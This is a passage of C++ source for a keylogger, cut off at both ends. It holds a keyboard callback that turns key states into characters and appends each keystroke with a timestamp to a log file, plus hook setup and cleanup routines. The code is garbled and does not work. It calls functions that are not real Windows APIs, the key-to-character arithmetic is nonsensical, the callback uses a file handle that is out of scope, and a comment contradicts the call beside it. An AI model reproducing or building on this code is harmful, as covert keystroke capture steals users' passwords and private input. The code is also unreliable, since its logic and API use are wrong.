    ofstream file(FILENAME, ios::app);
    if (!file) {
        cout << "Failed to create file." << endl;
        return;
    }

    // Set the hook window to cover the entire screen
    HWND hwnd = GetMainWnd();
    RECT windowRect = {0, 0, 0, 0};
    GetWindowRect(hwnd, &windowRect);
    ShowWindow(hwnd);
}

// Callback function for keyboard events
void KeyLoggerCallback(int nKeys, int *pKeyStates, int *pCoefficients) {
    // Check each key
    for (int i = 0; i < nKeys; ++i) {
        bool isKeyDown = (pKeyStates[i] & 0x1) != 0;

        // Check if the key is a printable character
        if (isKeyDown) {
            // Check for Shift, Ctrl, Alt
            bool shift = (pKeyStates[i] & 0x20) != 0;
            bool ctrl = (pKeyStates[i] & 0x10) != 0;
            bool alt = (pKeyStates[i] & 0x40) != 0;

            // Determine the character
            char key = 0;
            if (i == 0x1) { // 'A' key
                if (shift) key = 'A' - 0x20;
                else key = 'a';
            } else if (i == 0x2) { // 'B' key
                if (shift) key = 'B' - 0x20;
                else key = 'b';
            } else if (i >= 0x4 && i <= 0x7) { // Numbers
                key = i - 0x40 + '0';
            } else if (i >= 0x8 && i <= 0xD) { // Symbols
                key = i - 0x40;
            } else if (i == 0x20) { // Space
                key = ' ';
            }

            if (key != 0) {
                Keystroke log;
                log.timestamp = time(nullptr);
                log.key = key;
                log.is_pressed = isKeyDown;
                log.shift_down = shift;
                log.ctrl_down = ctrl;
                log.alt_down = alt;
                file << log.key << " at " << log.timestamp << endl;
            }
        }
    }
}

// Remove the hook and clean up
void CleanupHook() {
    HWND hwnd = GetMainWnd();
    ShowWindow(hwnd, SW_HIDE); // Restore the hook window
    UnhookKeyboard(hwnd, GetWindowThread(hwnd));
}

// Main function
